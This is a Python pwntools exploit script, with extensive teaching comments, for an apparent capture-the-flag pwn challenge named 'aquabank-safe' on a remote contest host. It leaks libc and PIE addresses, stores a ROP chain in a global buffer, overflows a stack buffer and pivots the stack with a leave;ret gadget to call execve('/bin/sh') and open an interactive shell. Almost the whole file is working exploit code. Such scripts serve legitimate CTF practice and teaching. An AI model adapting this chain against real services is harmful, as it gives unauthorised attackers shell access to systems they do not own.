#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        PIE enabled       =>  addresses are randomized, so we need to leak an address to calculate offsets

context.binary = elf = ELF('./aquabank-safe', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13507)

# By running: ROPgadget --binary ./aquabank-safe | grep "ret"
# we find that:
RET_GADGET = 0x101a

# Libc offsets (from the provided libc.so.6)
LIBC_PRINTF = 0x60100            # run: nm -D libc.so.6 | grep " printf"
LIBC_SYSTEM = 0x58750            # run: nm -D libc.so.6 | grep " system"
LIBC_POP_RDI = 0x10f78b          # run: ROPgadget --binary ./libc.so.6 | grep "pop rdi ; ret"
LIBC_POP_RSI = 0x110a7d          # run: ROPgadget --binary ./libc.so.6 | grep "pop rsi ; ret"
LIBC_POP_RAX = 0x0dd237          # run: ROPgadget --binary ./libc.so.6 | grep "pop rax ; ret"
LIBC_LEAVE_RET = 0x0299d2        # run: ROPgadget --binary ./libc.so.6 | grep "leave ; ret"
LIBC_XOR_EDX_SYSCALL = 0x0a0d7f  # run: ROPgadget --binary ./libc.so.6 | grep "xor edx, edx ; syscall"
LIBC_BINSH = next(libc.search(b'/bin/sh\x00'))    # or run: strings -a -t x libc.so.6 | grep "/bin/sh"

# PIE-relative offsets (from the provided 'aquabank-safe' binary file)
PIE_DIAGNOSTICS_OFFSET = 0x1387    # run: nm aquabank-safe | grep "diagnostics"
PIE_VAULT_OFFSET = 0x40a0          # run: nm aquabank-safe | grep "vault"


# =================================================================
# STEP 1: leak a libc address and also a pie address to bypass ASLR
# =================================================================

# NOTE: due to the fact that PIE is enabled, every time the program is started it is loaded at a random base address (ASLR).
# We cannot know in advance where the functions or gadgets are located: we must first obtain a run-time address (leak) and compute everything else from there.

p.recvuntil(b"> ")
p.sendline(b"1")  # choose "Diagnostics"

# Expected output:
#   [diag] printf @ 0x7f...
#   [diag] entry  @ 0x55... or 0x56... (depends on the randomization)
p.recvuntil(b"[diag] printf @ ")
printf_leak = int(p.recvline().strip(), 16)

p.recvuntil(b"[diag] entry  @ ")
diagnostic_leak = int(p.recvline().strip(), 16)

libc_base = printf_leak - LIBC_PRINTF
pie_base = diagnostic_leak - PIE_DIAGNOSTICS_OFFSET

log.success(f"libc_base = {hex(libc_base)}")
log.success(f"pie_base = {hex(pie_base)}")

# ===========================================================================================
# STEP 2: deposit the ROP chain in the vault (BSS) and trigger the stack pivot with leave;ret
# ===========================================================================================

vault_addr = pie_base + PIE_VAULT_OFFSET
pop_rdi = libc_base + LIBC_POP_RDI
pop_rsi = libc_base + LIBC_POP_RSI
pop_rax = libc_base + LIBC_POP_RAX
xor_edx_syscall = libc_base + LIBC_XOR_EDX_SYSCALL
leave_ret = libc_base + LIBC_LEAVE_RET
binsh_addr = libc_base + LIBC_BINSH

p.recvuntil(b"> ")
p.sendline(b"2")  # choose "Vault Deposit"

stage2 = flat(
    b'A' * 8,                       # padding to fill the first 8 bytes of the vault: we need to do this because the "leave" instruction
                                    # (placed at the end of the next payload) will pop 8 bytes from the vault into RBP, so we just need
                                    # to fill those 8 bytes with something that can be thrown away (it can be anything) to reach the
                                    # next 8 bytes of the vault, which will be the first gadget of our ROP chain (pop rdi; ret).
    
    p64(pop_rdi), p64(binsh_addr),  # prepare the first argument: execve("/bin/sh", ..., ...)
    p64(pop_rsi), p64(0),           # prepare the second argument: execve(..., NULL, ...)
    p64(pop_rax), p64(59),          # prepare the syscall number: execve = 59
    p64(xor_edx_syscall)            # prepare the third argument: execve(..., ..., NULL)
                                    # this gadget sets edx to 0 (so we obtain rdx = NULL, as needed) and then execute a syscall, which in this case will be execve("/bin/sh", NULL, NULL)
                                    # that's a kind of trick to avoid needing a "pop rdx; ret" gadget, which is NOT present in this libc version
)

p.recvuntil(b"[deposit] Vault deposit size (bytes): ")
p.sendline(str(len(stage2)).encode())

p.recvuntil(b"bytes:\n")
p.send(stage2)

p.recvuntil(b"[deposit] Deposit registered.\n")
log.success(f"ROP chain placed in vault @ {hex(vault_addr)} ({len(stage2)} byte)")

# =====================================================
# STEP 3: call open_safe() to exploit BOF + stack pivot
# =====================================================

# open_safe() reads 24 bytes into buf[8], overflowing into the two
# adjacent stack slots: [buf (8)] [saved_rbp (8)] [ret_addr (8)].
# We control all three regions with a single read().

# The strategy is to use a "leave ; ret" gadget as ret_addr to perform
# a stack pivot: instead of jumping directly into the vault (which is
# non-executable BSS memory, NX would block it), we redirect rsp there,
# turning the "vault" global variable into our fake stack to execute the ROP chain.

# "leave" expands to:  mov rsp, rbp   // copy rbp to rsp (move stack pointer)
#                      pop rbp        // reads [rsp] in rbp, increments rsp by 8
#
# In few words, we set rbp = vault_addr, then we set rsp = rbp = vault_addr, and thanks to this we have
# successfully hijacked the control flow and we are now executing the ROP chain we placed in the vault.

p.recvuntil(b"> ")
p.sendline(b"3")  # choose "Open Safe"

p.recvuntil(b"[safe] Enter the 24-byte combination:\n")
stage3 = flat(
    b'A' * 8,           # first 8 bytes are to fill the buffer and reach the saved RBP
    p64(vault_addr),    # overwrite the saved RBP with the address of the vault, so that when 'leave;ret' is executed (look at the next line), RSP will point to the vault and the next 'ret' will jump to our ROP chain
    p64(leave_ret)      # leave;ret gadget serves to set RSP to the value of RBP (which we just overwrote with vault_addr) and then execute a 'ret' that will jump to the ROP chain we placed in the vault
)

p.send(stage3)

p.interactive()
